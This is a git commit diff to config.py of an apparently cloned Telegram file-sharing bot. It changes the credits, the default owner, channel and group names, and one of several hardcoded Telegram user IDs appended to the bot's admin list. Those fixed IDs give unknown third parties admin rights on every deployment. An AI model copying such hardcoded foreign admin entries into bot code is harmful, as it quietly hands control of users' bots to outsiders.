4d3589ee6e70e1f95e1789381a9b3b24221cc314
putraicipiyey <88121146+putraicipiyey@users.noreply.github.com>
2022-06-21 05:03:51 +0800

    Update config.py

--- config.py
+++ config.py
@@ -1,5 +1,5 @@
 # (©)Codexbotz
-# Recife By Zaen @Mafia_Tobatz
+# Recode by putra @b64decode
 # Kalo clone Gak usah hapus 
 # gue tandain akun tele nya ngentod
 
@@ -24,14 +24,14 @@ CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 OWNER_ID = int(os.environ.get("OWNER_ID", ""))
 
 # NAMA OWNER
-OWNER = os.environ.get("OWNER", "@Mafia_Tobatz")
+OWNER = os.environ.get("OWNER", "b64decode")
 
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
 # Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "Lunatic0de")
-GROUP = os.environ.get("GROUP", "SharingUserbot")
+CHANNEL = os.environ.get("CHANNEL", "dyecstar")
+GROUP = os.environ.get("GROUP", "demusplace")
 
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
@@ -70,7 +70,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1250450587)
+ADMINS.append(5548552886)
 ADMINS.append(844432220)
 ADMINS.append(1750080384)
 
